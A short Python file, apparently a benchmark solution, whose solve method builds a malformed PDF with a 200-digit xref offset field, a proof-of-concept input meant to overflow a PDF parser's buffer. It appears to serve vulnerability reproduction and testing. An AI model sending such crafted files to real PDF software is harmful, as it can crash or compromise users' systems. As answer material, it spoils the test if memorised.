import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        header = b"%PDF-1.1\n"
        zeros_len = 200
        first_field = b"0" * zeros_len
        second_field = b"00000"
        entry_line = first_field + b" " + second_field + b" f \n"
        xref_section = b"xref\n0 1\n" + entry_line
        trailer = b"trailer\n<< /Size 1 >>\n"
        xref_offset = len(header)
        startxref = b"startxref\n" + str(xref_offset).encode() + b"\n%%EOF\n"
        content = header + xref_section + trailer + startxref
        return content
